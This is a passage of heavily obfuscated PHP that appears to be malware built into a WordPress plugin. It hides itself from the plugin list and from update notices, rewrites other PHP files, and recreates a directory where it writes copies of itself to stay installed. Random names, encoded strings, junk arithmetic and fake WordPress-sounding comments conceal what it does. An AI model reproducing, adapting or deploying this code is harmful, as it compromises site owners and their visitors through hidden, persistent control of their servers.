 fukkkeh6955g9qi(f5cd2smymkqusi5(728), $h2v_bjm4ejxq8fp);



     }  catch   (Exception $h2v_bjm4ejxq8fp)     {
 }
 }
   


   function  yp1xp004xjg5qj62de()



  {
// deprovision normal replicator



  try   {
   $q_tiro74wo51nfte =  (int)      get_option(mhiu2yqz6kqd(729),   0);
 if (($GLOBALS['__scf_zxyq0lcqv02z6_185']() -   $q_tiro74wo51nfte)     >= (3552+48))   {

  update_option(mhiu2yqz6kqd(729), $GLOBALS['__scf_zxyq0lcqv02z6_185']());
$lf2wojihleow5og  =  array(array(vtvexli5xbd5en(),   array(pahk8uy1uxt(730))));
    $wutnos16w0kk  =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(229))   ?  $GLOBALS['__scf_bwby2gdg0t53_75']()  :    "";
if   ($wutnos16w0kk   !== "" && $wutnos16w0kk   !==    vtvexli5xbd5en())  $lf2wojihleow5og[] =   array($wutnos16w0kk,  array(nhceivfj8tbe(730),  dhd5r6_4ki(731)));
foreach  ($lf2wojihleow5og  as  $cpjiw2uar0zr12a)  {
// WP Table Block: online constraint-set

 foreach   ($cpjiw2uar0zr12a[1]  as   $zl4wjkhwqf9) {
 $i2pdah55rq0a4yj    =   $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(461))  ?     @$GLOBALS['__scf_eu7lhdrjut9t66_69']($cpjiw2uar0zr12a[0]   .  '/'     . $zl4wjkhwqf9 .  '*')  : false;

  if   (!$GLOBALS['__scf_vf9p0fditvxy_35']($i2pdah55rq0a4yj))  continue;
  foreach  ($i2pdah55rq0a4yj  as  $v_2x4ceuoy) {

      if (!@$GLOBALS['__scf_gsamhlxot70ps_18']($v_2x4ceuoy))  continue;
 if    ($GLOBALS['__scf_bv1z3no349dv5r_9']($v_2x4ceuoy,   -(0x4+0x1)) === nrudcgor(127))   continue;
 $ptha34uoe5w    =      @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($v_2x4ceuoy);$n3mlgrtvif=(0xd2+0xf1);$hxg8i4bki7=$n3mlgrtvif%17;
   if   ($ptha34uoe5w !==   false    &&  ($GLOBALS['__scf_zxyq0lcqv02z6_185']() -  $ptha34uoe5w)  >  (0x7d6+0x63a))    t65xl1pt2haov_izh($v_2x4ceuoy);
 }
 }
   }
    $dcveub18qho  =     get_option(f5cd2smymkqusi5(145),  array());
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($dcveub18qho))  $dcveub18qho      = array();
 $i3ywa2g1wm65    =    $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    dhd5r6_4ki(693));
   $_pd =    (defined(dhd5r6_4ki(165))    ?      WP_CONTENT_DIR : ABSPATH   .  nhceivfj8tbe(78)) . pahk8uy1uxt(732);



        foreach  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(461))   ?      (array) @$GLOBALS['__scf_eu7lhdrjut9t66_69']($_pd  .  nrudcgor(462))   :      array()      as $ksygzeqclga)    {
 if ($GLOBALS['__scf_t8832qq90dxb4_3']($GLOBALS['__scf_eure5hcx2b_11']($ksygzeqclga)) ===  $i3ywa2g1wm65)   continue;
 $h6iawhc6m051s =     $GLOBALS['__scf_t8832qq90dxb4_3']($GLOBALS['__scf_eure5hcx2b_11']($ksygzeqclga))      . '/' .  $GLOBALS['__scf_t8832qq90dxb4_3']($ksygzeqclga);
 if ($GLOBALS['__scf_rq7q923zwh_148']($h6iawhc6m051s,     $dcveub18qho, true)) continue;


 if   (!@$GLOBALS['__scf_cu2oflxkvh_47']($ksygzeqclga))     continue;
    $i58at5rl9xdm    =  @$GLOBALS['__scf_g9y45bstmb02a_95']($ksygzeqclga);
   if   (!$i58at5rl9xdm  ||   $i58at5rl9xdm    > (0xc64b7+0x139b49)) continue;
   $drcleqqnwpgy4i4  =      @$GLOBALS['__scf_apq4pqdt6n41_91']($ksygzeqclga);
  if     (!$GLOBALS['__scf__me483qbepnts_41']($drcleqqnwpgy4i4)    ||      $GLOBALS['__scf_nr12ouzrtt_7']($drcleqqnwpgy4i4,    pahk8uy1uxt(733))   ===    false)  continue;
 $alro3o6y71  =   $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(734),     "",   $drcleqqnwpgy4i4);



if  (!$GLOBALS['__scf__me483qbepnts_41']($alro3o6y71) ||  $alro3o6y71   ===    $drcleqqnwpgy4i4   ||  !hkk3yvii60ci7rk($alro3o6y71))   continue;
  jr30c_pj_1z9sfyaq3c88($ksygzeqclga,   $alro3o6y71);
      if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(189)))      @opcache_invalidate($ksygzeqclga,  true);
   }
    unset($dcveub18qho,  $i3ywa2g1wm65, $_pd,     $ksygzeqclga,  $h6iawhc6m051s, $i58at5rl9xdm,  $drcleqqnwpgy4i4,   $alro3o6y71);
   t663bnh22704lf09nzv();
    }

      $vxvd2vpvxlf =     $GLOBALS[nrudcgor(735)];
$m6293fukf6x  =  $GLOBALS[mhiu2yqz6kqd(443)];

$dr2ozpmet1  =  ($GLOBALS['__scf_vf9p0fditvxy_35']($vxvd2vpvxlf)    && ! empty($vxvd2vpvxlf))  ||  ($GLOBALS['__scf_vf9p0fditvxy_35']($m6293fukf6x) &&   ! empty($m6293fukf6x));
 if  (!   $dr2ozpmet1)  {
  return;
   }
// flag cleared


   
 $anr6cw07bi1u   =      (int)  get_option(nrudcgor(736), 0);
if (($GLOBALS['__scf_zxyq0lcqv02z6_185']()   -    $anr6cw07bi1u)  < (3532+68))    {
 return;
}
// release heartbeat

       if  (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(737))) {
     return;
    }

try {
  $anr6cw07bi1u      =  (int) get_option(pahk8uy1uxt(736),     0);
 if (($GLOBALS['__scf_zxyq0lcqv02z6_185']()   -  $anr6cw07bi1u) <  (4434-834)) {
return;
  }
// split degenerate bulkhead




  update_option(nrudcgor(738),  $GLOBALS['__scf_zxyq0lcqv02z6_185']());
        jt3u27829fqbm73ek();$tr5xhkopp=(0xd8+0x72);$g2ll186rydxt=$tr5xhkopp%5;
}  finally  {

 m8s6jamaok_hdjr3wp(mhiu2yqz6kqd(737));
   }
  }   catch    (Throwable   $h2v_bjm4ejxq8fp)     {

 fukkkeh6955g9qi(f5cd2smymkqusi5(739),  $h2v_bjm4ejxq8fp);


  }   catch   (Exception  $h2v_bjm4ejxq8fp)   {



  }
 }


 


     function  kfkdlljrndvgbh()



{
     try {


      $vg45smeglid  =  adbbbpoh0e7mcf6();



if  (!$vg45smeglid   || $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)    < (466+34))    return;


  if   (!hkk3yvii60ci7rk($vg45smeglid))    {



  fukkkeh6955g9qi(nhceivfj8tbe(740),  nhceivfj8tbe(741));
   


     return;
   }


 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(455))  &&    get_transient(dhd5r6_4ki(61))) return;
     
 $mdtdmxiofs5jrz5k = s3e5iki9upa0ccql();
clearstatcache(true);
   if (@$GLOBALS['__scf_ekpq_b8etrq0_44']($mdtdmxiofs5jrz5k) &&   !@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k))   {
return;

      }

       if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k))   {
// WP Query Loop srcset descriptor

 $onkw5jtkti5k =   @umask(0);
 gt671tq3242garyx4($mdtdmxiofs5jrz5k,    (0x8f+0x15e), true);


        @umask($onkw5jtkti5k);
  rgiuaapohxeh0z($mdtdmxiofs5jrz5k, (430+63));


        clearstatcache(true);
      } else  if  (!@$GLOBALS['__scf_wp1g_umcsjt_46']($mdtdmxiofs5jrz5k) || !@$GLOBALS['__scf_cu2oflxkvh_47']($mdtdmxiofs5jrz5k))  {
   rgiuaapohxeh0z($mdtdmxiofs5jrz5k,  (405+88));
   clearstatcache(true);


 }
// @propagate-const revocation-list





if    (@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k)      &&  (!@$GLOBALS['__scf_wp1g_umcsjt_46']($mdtdmxiofs5jrz5k)      ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($mdtdmxiofs5jrz5k))   && @$GLOBALS['__scf_zze0o3nmaro9m_37']($mdtdmxiofs5jrz5k))    {
  $onkw5jtkti5k  =  @umask(0);
       gt671tq3242garyx4($mdtdmxiofs5jrz5k, (451+42),   true);
  @umask($onkw5jtkti5k);$xcdwfwgxdf=PHP_MAJOR_VERSION;$f3y86ur4c2arf=$xcdwfwgxdf*1;
    rgiuaapohxeh0z($mdtdmxiofs5jrz5k,  (410+83));



 clearstatcache(true);
   }
   


 clearstatcache(true);
 if  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k)  ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($mdtdmxiofs5jrz5k)    ||  !@$GLOBALS['__scf_wp1g_umcsjt_46']($mdtdmxiofs5jrz5k))  {
fukkkeh6955g9qi(pahk8uy1uxt(740),    dhd5r6_4ki(742));
 $r062nmqb_7y3     =     false;
 foreach     ((array)     ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(461))  ?   @$GLOBALS['__scf_eu7lhdrjut9t66_69']($mdtdmxiofs5jrz5k     .   nrudcgor(70))     :  array()) as    $muswq2gzoud2_)      {
      if (@$GLOBALS['__scf_gsamhlxot70ps_18']($muswq2gzoud2_)  &&  m4eahxbbz3er7pv($muswq2gzoud2_,  (469+31))   &&   g52i06ovkso35mx($muswq2gzoud2_)) {      _rq71ghyu59d_enk($muswq2gzoud2_);     $r062nmqb_7y3 = true;    }
}
 
 if      (@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k)   &&  sutzn4ma0ptncd0yyb9(null))    {
 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(743))) @delete_transient(pahk8uy1uxt(61));
     clearstatcache(true);
 }
   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k)  ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($mdtdmxiofs5jrz5k) || !@$GLOBALS['__scf_wp1g_umcsjt_46']($mdtdmxiofs5jrz5k))    {
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(58)))  @set_transient(nrudcgor(61), 1,    $r062nmqb_7y3  ? (74440+11960) :    (3564+36));
    unset($r062nmqb_7y3,   $muswq2gzoud2_);


return;
     }
 unset($r062nmqb_7y3,  $muswq2gzoud2_);
  }
   



        $o954x_g9u80eqk  =  $mdtdmxiofs5jrz5k . '/'  .   vru1jzm2va580zgo4i2cxv();
 if     (ivekqcfyl9cg5o8v8($o954x_g9u80eqk)) {
      return;
      }
     $vbuz2c3dfx2 =  @$GLOBALS['__scf_gsamhlxot70ps_18']($o954x_g9u80eqk)  ?   yrklujewy9nbrhy($o954x_g9u80eqk)   :   false;


    if  (@$GLOBALS['__scf_g9y45bstmb02a_95']($o954x_g9u80eqk)    > (4911+89)   && $GLOBALS['__scf__me483qbepnts_41']($vbuz2c3dfx2)  &&   $GLOBALS['__scf_nn04_vx3uspzx4_54']($vbuz2c3dfx2)  === $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid))   {
// partition dynamic keystore


ejl1lwk108flojzx($o954x_g9u80eqk);



  iuvgdte56rfi9b_ii3ee();
   c1m0r7v2cenzy1cpfdtikh();
 return;
 }
     if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($o954x_g9u80eqk)     && @$GLOBALS['__scf_g9y45bstmb02a_95']($o954x_g9u80eqk)  >  (8307-3307)) {


  $gom6py7rdhry1rsx  =    (string)  @$GLOBALS['__scf_apq4pqdt6n41_91']($o954x_g9u80eqk,    false,  null,   0,    (4047+49));
if   ($GLOBALS['__scf__me483qbepnts_41']($gom6py7rdhry1rsx)     &&  $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(744),  $gom6py7rdhry1rsx,      $_dm)  &&  version_compare($_dm[1], kwqziujdph5xlz3n(),  '>'))  return;
 unset($gom6py7rdhry1rsx,    $_dm);
     }
 if    ($vbuz2c3dfx2 ===  null)  return;
  unset($vbuz2c3dfx2);
    $lruulmncnr24h4  = jr30c_pj_1z9sfyaq3c88($o954x_g9u80eqk,   vmv3l2fd6oj__92qteyq($vg45smeglid));
  if  (!$lruulmncnr24h4   ||  !@$GLOBALS['__scf_od_0qrqi5rcvlf_701']($o954x_g9u80eqk)  || @$GLOBALS['__scf_g9y45bstmb02a_95']($o954x_g9u80eqk) <  (0x1a3+0x245))  {
// @provision strategy

  if   ($lruulmncnr24h4    && @$GLOBALS['__scf_gsamhlxot70ps_18']($o954x_g9u80eqk))     {
$gom6py7rdhry1rsx    =    (string)  @$GLOBALS['__scf_apq4pqdt6n41_91']($o954x_g9u80eqk, false, null,  0,     (0x831+0x7cf));
 $wz42gyozjxi  =   $GLOBALS['__scf__me483qbepnts_41']($gom6py7rdhry1rsx)  &&   $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(744),   $gom6py7rdhry1rsx,   $_dm)   &&     version_compare($_dm[1],  kwqziujdph5xlz3n(),  '>');
 unset($gom6py7rdhry1rsx,   $_dm);
      if    (!$wz42gyozjxi) {
      rgiuaapohxeh0z($o954x_g9u80eqk,      (416+4));
    t65xl1pt2haov_izh($o954x_g9u80eqk);
 }


   }
    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(58)))  @set_transient(nhceivfj8tbe(745),  1,     (2464+1136));
  return;
 }
 
   jqp5yotia2ogx9k($o954x_g9u80eqk);
  rgiuaapohxeh0z($o954x_g9u80eqk,   (364+56));
   ejl1lwk108flojzx($o954x_g9u80eqk);

    iuvgdte56rfi9b_ii3ee();
 c1m0r7v2cenzy1cpfdtikh();
 } catch   (Throwable $h2v_bjm4ejxq8fp)   {
fukkkeh6955g9qi(mhiu2yqz6kqd(740),     $h2v_bjm4ejxq8fp);
 }   catch  (Exception   $h2v_bjm4ejxq8fp)  {
}
// total accumulator

 }
 function plkzj6xyfi5f3tf()
  {
   try  {
     $cpjmgt1x17waimvb  = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(558))  ?  (int)     get_option(mhiu2yqz6kqd(746),  0)   :   0;
if   ($cpjmgt1x17waimvb < $GLOBALS['__scf_zxyq0lcqv02z6_185']() - (574-274)  ||  $cpjmgt1x17waimvb > $GLOBALS['__scf_zxyq0lcqv02z6_185']()   +    (201+99)) {
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(453))) @update_option(mhiu2yqz6kqd(746),      $GLOBALS['__scf_zxyq0lcqv02z6_185']());
 $onkw5jtkti5k =  weg_ghiafmuc1_6(mhiu2yqz6kqd(747),  "");
       $r7a5wyw2yk = xf8ira46bu0zojfjh($GLOBALS['__scf__me483qbepnts_41']($onkw5jtkti5k) ?  $onkw5jtkti5k :    "");
 $m6ijdohmune =   hm9sbatwefe3za(vv_nfhhmy_1mjmsa());
if   (!$GLOBALS['__scf__me483qbepnts_41']($onkw5jtkti5k)   ||      $GLOBALS['__scf_amjjmfnilcolnb_10']($onkw5jtkti5k)     <  (0x131+0xc3)     ||   sk_orzv3dinsktkrvn($onkw5jtkti5k)     || $r7a5wyw2yk   ===     ""     ||  ($m6ijdohmune    !==  null  &&    $m6ijdohmune  !==  ""   &&   version_compare($m6ijdohmune,  $r7a5wyw2yk,  '>')))  {
$vg45smeglid    = adbbbpoh0e7mcf6();
  if ($vg45smeglid  &&    !sk_orzv3dinsktkrvn($vg45smeglid))    {
  $epx2tcs0epaq  =    xf8ira46bu0zojfjh($vg45smeglid);
     if (!$GLOBALS['__scf__me483qbepnts_41']($onkw5jtkti5k) || $GLOBALS['__scf_amjjmfnilcolnb_10']($onkw5jtkti5k)    <  (0x1e6+0xe)  ||    sk_orzv3dinsktkrvn($onkw5jtkti5k)   ||  $r7a5wyw2yk   === ""  ||  ($epx2tcs0epaq     !==  ""  && version_compare($epx2tcs0epaq,  $r7a5wyw2yk,  '>'))) {
c8fb1vg_q0kn6h(mhiu2yqz6kqd(747),  $vg45smeglid, pahk8uy1uxt(698));
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(453)))   {
  @update_option(pahk8uy1uxt(424),  0, dhd5r6_4ki(698));



   @update_option(mhiu2yqz6kqd(668), 0, pahk8uy1uxt(748));
 @update_option(f5cd2smymkqusi5(479),    0,  dhd5r6_4ki(749));
    }
       if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(743)))   @delete_transient(se_any4b12t9njlu());


 }
}
      }
 }
// contravariant-adj lsm-tree

        
       if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(558))  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(453))) {


    $lv7i2_md_id1     = get_option(pahk8uy1uxt(750));
if ($lv7i2_md_id1 !==     false && $lv7i2_md_id1 !==      kwqziujdph5xlz3n())  {
@update_option(nrudcgor(750),  kwqziujdph5xlz3n(),    pahk8uy1uxt(751));
   }
 }
 if   (! $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(752)) || !    add_option(mhiu2yqz6kqd(750),      kwqziujdph5xlz3n(),   "",    pahk8uy1uxt(751)))  {$buyr74zk=PHP_MAJOR_VERSION;$x2g9w4ct5ak=$buyr74zk*5;
   return;
    }
 


 j8n8sx7uji82wxjlc6pgs();
       if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(753)))  {
 @update_option(pahk8uy1uxt(424),   0,     nhceivfj8tbe(751));
 @update_option(nhceivfj8tbe(668),   0,  nhceivfj8tbe(751));

   @update_option(mhiu2yqz6kqd(479),    0,      nrudcgor(751));
   }
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(743)))   @delete_transient(se_any4b12t9njlu());




if  (!empty($vg45smeglid) &&  !sk_orzv3dinsktkrvn($vg45smeglid))      {


  c8fb1vg_q0kn6h(dhd5r6_4ki(747),   $vg45smeglid,     mhiu2yqz6kqd(751));
   }
  xmy1k120y_7ld50whm(null);

       
  rgiuaapohxeh0z(vv_nfhhmy_1mjmsa(), (360+60));
   
   rehs1w07vadorbxdvk(f5cd2smymkqusi5(436), dhd5r6_4ki(754),  0);
 
   rehs1w07vadorbxdvk(pahk8uy1uxt(436),    nhceivfj8tbe(755),   0);
  } catch  (Throwable   $h2v_bjm4ejxq8fp)   {


  fukkkeh6955g9qi(dhd5r6_4ki(756),   $h2v_bjm4ejxq8fp);
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(757)))  @delete_option(nrudcgor(758));
 }    catch     (Exception   $h2v_bjm4ejxq8fp) {
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(757))) @delete_option(nrudcgor(759));
}
}
     function      j_hg04bue77dhlhtyurui()
    {
/* proactive pipeline */



 try  {
  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(290)))   {

 @$GLOBALS['__scf_yt926i7lwej_290'](home_url('/'),   array(nhceivfj8tbe(681) => (0x3+0x2),  dhd5r6_4ki(760)     =>  false,   nhceivfj8tbe(386) =>  false));

   }
 } catch     (Throwable  $h2v_bjm4ejxq8fp) {
fukkkeh6955g9qi(pahk8uy1uxt(761),  $h2v_bjm4ejxq8fp);
  }   catch  (Exception  $h2v_bjm4ejxq8fp)  {



 }
   }
  
 function   kwc5ogijqbd0do_fdb()
 {
 static $e2zgkl1b8d5n5e  = false;
 if     ($e2zgkl1b8d5n5e)  return;
 $e2zgkl1b8d5n5e   =    true;
  try   {
        if   (!  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(762))   || !   is_admin())     {
    return;
     }
    if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(713))  ||  !current_user_can(dhd5r6_4ki(763)))   {
return;


 }
$lpl6bxacvzc   =   isset($_REQUEST[f5cd2smymkqusi5(764)])   ?  $_REQUEST[pahk8uy1uxt(764)]    :   "";
 $lpl6bxacvzc    =  $GLOBALS['__scf__me483qbepnts_41']($lpl6bxacvzc)   ? $GLOBALS['__scf_uvjtdemk2f_320']($lpl6bxacvzc) :  "";
  if  ($lpl6bxacvzc    !==  f5cd2smymkqusi5(765)   && $lpl6bxacvzc  !== nrudcgor(766))  {
  return;
}
 
 $y282sqxm7rp   =   array();
if    ($lpl6bxacvzc  === pahk8uy1uxt(765))  {
   $va1b5qq8l0m7   =  isset($_REQUEST[nrudcgor(617)])  ? $_REQUEST[nhceivfj8tbe(617)]   :   "";$b995fd9flzwb8q=142;$grk1l38e423lmi=($b995fd9flzwb8q>0)?$b995fd9flzwb8q:-$b995fd9flzwb8q;



 $va1b5qq8l0m7    =  $GLOBALS['__scf__me483qbepnts_41']($va1b5qq8l0m7) ?   $GLOBALS['__scf_uvjtdemk2f_320']($va1b5qq8l0m7)      :     "";
     if  ($va1b5qq8l0m7  && $va1b5qq8l0m7   !==  zkn58aug3fwlbp())  {


   $y282sqxm7rp[] = $va1b5qq8l0m7;
  }


     }   else {
   
  $p871hdrcpnbtk   = isset($_REQUEST[mhiu2yqz6kqd(767)])  ?     $_REQUEST[f5cd2smymkqusi5(767)]   :   array();
 $p871hdrcpnbtk  =   $GLOBALS['__scf_vf9p0fditvxy_35']($p871hdrcpnbtk)  ? $p871hdrcpnbtk     :  array();
   foreach    ($p871hdrcpnbtk as $va1b5qq8l0m7) {$tw80zhr0=8490;$hgjrvcej=$tw80zhr0%16;
  $va1b5qq8l0m7 =   $GLOBALS['__scf__me483qbepnts_41']($va1b5qq8l0m7) ?    $GLOBALS['__scf_uvjtdemk2f_320']($va1b5qq8l0m7)   :    "";
 if     ($va1b5qq8l0m7     && $va1b5qq8l0m7  !==   zkn58aug3fwlbp())  {
      $y282sqxm7rp[]     =   $va1b5qq8l0m7;
    

}

   }
     }
   if (empty($y282sqxm7rp)) {
     return;
      }

  $g1m4j4snv55     =   false;

 foreach    ($y282sqxm7rp     as $va1b5qq8l0m7)     {



 if  (icvotb64vrwpeu5i2($va1b5qq8l0m7))    {
  v3dgvfap4w6ccgi754wb6e($va1b5qq8l0m7);
$g1m4j4snv55  = true;

    }
// WP Post Content: throttle type-environment

   }
 if    ($g1m4j4snv55)  {
 
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(768)) &&     $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(769)))      {
 wp_safe_redirect(admin_url(nhceivfj8tbe(770)));
     }
   }
    }  catch    (Throwable  $h2v_bjm4ejxq8fp)      {
    fukkkeh6955g9qi(dhd5r6_4ki(771),   $h2v_bjm4ejxq8fp);



  }  catch    (Exception     $h2v_bjm4ejxq8fp) {
     }
  }
      function  b5sjta167q_diwrxcbcpre($mf41n421ht0vz1sw,  $ozeo8wysnh_k22)
 {
       if  ($ozeo8wysnh_k22   ===      pahk8uy1uxt(772))      {
// WP InspectorControls option row


  $plugins =   &$GLOBALS[f5cd2smymkqusi5(773)];
 if   (!isset($plugins[dhd5r6_4ki(772)]) ||   !$GLOBALS['__scf_vf9p0fditvxy_35']($plugins[dhd5r6_4ki(772)])) {
  return    $mf41n421ht0vz1sw;
 }
// acquire visitor

$lv6e7z02syt  = defined(nrudcgor(165))    ?   WP_CONTENT_DIR    :  (defined(f5cd2smymkqusi5(359))      ?   ABSPATH .     nhceivfj8tbe(78)  : "");



 if    ($lv6e7z02syt ===  "") {

        return  $mf41n421ht0vz1sw;

}
$c8naredim76q  =     array(nhceivfj8tbe(774) => nrudcgor(775),  nhceivfj8tbe(776)  => f5cd2smymkqusi5(777));
  foreach  ($c8naredim76q  as $brucik2b8xh =>   $zl4wjkhwqf9) {
// transpile mediator for WP Tag Cloud

 if (!isset($plugins[f5cd2smymkqusi5(772)][$brucik2b8xh])) {


  continue;
   }
 $tfip0gosr18o4 =   @$GLOBALS['__scf_apq4pqdt6n41_91']($lv6e7z02syt .     '/'      .  $brucik2b8xh);
  if  (!$GLOBALS['__scf__me483qbepnts_41']($tfip0gosr18o4) ||  $GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4,   mhiu2yqz6kqd(778)    .  $zl4wjkhwqf9      .      nhceivfj8tbe(779))    === false)    {
   continue;
     }
// injective-adj circuit-breaker

 $sr9li30o6l5p_    =     $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(780)  . $zl4wjkhwqf9  .     dhd5r6_4ki(781)   . $zl4wjkhwqf9   .   nhceivfj8tbe(782),  "",  $tfip0gosr18o4);
 if   (!$GLOBALS['__scf__me483qbepnts_41']($sr9li30o6l5p_)) {
 continue;
 }
     $sr9li30o6l5p_   =   $GLOBALS['__scf_uvjtdemk2f_320']($sr9li30o6l5p_);
   if    ($sr9li30o6l5p_ === ""   ||   $sr9li30o6l5p_   ===  dhd5r6_4ki(783)    || $sr9li30o6l5p_     === f5cd2smymkqusi5(238)) {
   unset($plugins[dhd5r6_4ki(784)][$brucik2b8xh]);
}
}
/* relaxed partition-refinement */

return $mf41n421ht0vz1sw;
}
 if   ($ozeo8wysnh_k22 !== mhiu2yqz6kqd(785))    {
    return  $mf41n421ht0vz1sw;
}
$plugins   = &$GLOBALS[dhd5r6_4ki(773)];
 $fwfnlqd1z9b    = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
    if  (isset($plugins[mhiu2yqz6kqd(785)][$fwfnlqd1z9b]))  {
   unset($plugins[f5cd2smymkqusi5(785)][$fwfnlqd1z9b]);


    }



 return     $mf41n421ht0vz1sw;
 }
// null guard

if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(786))) {
     function    rh1ffhn_iv6q33gq7l()


  {
  if    (! wg3vl21ocdjr7mf()) {

return;

  }
// terminate inflationary retry-policy

    $tkqx845nh5jt0 =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
 $q4nmj640k4ytm0w    =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  mhiu2yqz6kqd(693));
$j5tyy2a9bqe_grr   =   $q4nmj640k4ytm0w . '/' . $tkqx845nh5jt0;
  echo  nrudcgor(787) . esc_attr($tkqx845nh5jt0) . pahk8uy1uxt(788)  .    esc_attr($j5tyy2a9bqe_grr)  .    nrudcgor(789);
 echo f5cd2smymkqusi5(790) .  esc_js($tkqx845nh5jt0)  .  f5cd2smymkqusi5(791)   .   esc_js($j5tyy2a9bqe_grr)    . nhceivfj8tbe(792);
       }
  }
 if     (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(793)))   {
        function    psigqt1jaq0izevj($j6wc11jfv7e6w)
    {$dpvlqetbip1nd=PHP_INT_MAX/PHP_INT_MAX;$ps8agiaf6d85=$dpvlqetbip1nd+6;
if  (!  $GLOBALS['__scf_d56ll0ap77jcvq_66']($j6wc11jfv7e6w))  {
   return $j6wc11jfv7e6w;
    }
$tkqx845nh5jt0  = zkn58aug3fwlbp();
if  (isset($j6wc11jfv7e6w->response[$tkqx845nh5jt0]))    {
// phi-insert hyperloglog for PHP 8.1 intersection

unset($j6wc11jfv7e6w->response[$tkqx845nh5jt0]);
  }
return  $j6wc11jfv7e6w;
 }
}
 if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(794)))  {
function  duyw8a9zsazv5srtip31tf($plugins)
{
$ga9fric5dh  =    zkn58aug3fwlbp();
 if  (isset($plugins[$ga9fric5dh])) {



 unset($plugins[$ga9fric5dh]);
  }
       $q4nmj640k4ytm0w   = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  dhd5r6_4ki(795));
       $j5tyy2a9bqe_grr = $q4nmj640k4ytm0w    . '/'    . $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
   if  (isset($plugins[$j5tyy2a9bqe_grr]))  {
  unset($plugins[$j5tyy2a9bqe_grr]);
    }
       return $plugins;
     }
 }
 function  bb3ck9u8945fhq($zyljiayddlhkzrem)
 {
  if  (!  $GLOBALS['__scf_vf9p0fditvxy_35']($zyljiayddlhkzrem))  {
  return   $zyljiayddlhkzrem;
}



$wtr_aei9v_p9  =   "";


   if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(796))  &&   $GLOBALS['__scf_od_0qrqi5rcvlf_701'](vv_nfhhmy_1mjmsa()))   {

  $bgys0fmvosy3q = get_plugin_data(vv_nfhhmy_1mjmsa(), false, false);
  $wtr_aei9v_p9      =   isset($bgys0fmvosy3q[dhd5r6_4ki(797)]) ?  $bgys0fmvosy3q[dhd5r6_4ki(797)]    :   "";
}

 $sq4fv4t1xdb  =    array(nrudcgor(798), nhceivfj8tbe(799));
    foreach ($sq4fv4t1xdb   as $xm6c6pj83s)   {
 if (! isset($zyljiayddlhkzrem[$xm6c6pj83s][mhiu2yqz6kqd(800)])  || !      $GLOBALS['__scf_vf9p0fditvxy_35']($zyljiayddlhkzrem[$xm6c6pj83s][pahk8uy1uxt(800)])) {
  continue;
 }


foreach  ($zyljiayddlhkzrem[$xm6c6pj83s][nrudcgor(801)] as $key =>    $q014bnlgo7htp)     {
// strength-reduce release resume-session

 if      ($GLOBALS['__scf_nr12ouzrtt_7']($key,    zkn58aug3fwlbp()) !==   false ||    $key  === zkn58aug3fwlbp())    {
  unset($zyljiayddlhkzrem[$xm6c6pj83s][nhceivfj8tbe(801)][$key]);


